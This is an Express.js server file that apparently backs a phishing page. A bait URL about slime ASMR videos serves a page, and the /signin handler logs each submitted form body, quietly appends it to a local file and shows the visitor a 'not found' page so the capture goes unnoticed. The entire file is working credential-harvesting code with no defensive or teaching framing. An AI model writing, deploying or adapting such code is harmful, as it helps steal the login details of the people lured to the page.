var http = require('http');
var express = require('express');
var fs = require('fs');
const path = require('path');
var app = express();

app.use('/',express.static('public'));

app.use(express.urlencoded({
    extended:false
}));
app.use(express.json());

app.get('/', (req,res) => {
    res.sendFile(path.join(__dirname,'index.html'))
});

app.get('/satisfiying/slimevids/asmrvideo/stressrelieving', (req,res) => {
    res.sendFile(path.join(__dirname,'index.html'))
});

app.get('/not-found', (req,res) => {
    res.sendFile(path.join(__dirname,'notfound.html'))
});

// app.get('/login', (req,res) => {
//     res.sendFile(path.join(__dirname,'login.html'))
// });


app.post('/signin', (req,res) => {
    console.log('Data',req.body);
    fs.writeFile(__dirname + '/files/file',JSON.stringify(req.body),{flag: 'a'},function(){
    }
    )
    res.sendFile(path.join(__dirname,'notfound.html'))
    // res.redirect('/notfound.html')
});

 

app.listen(80, ()=>{
    console.log('server is listening')
})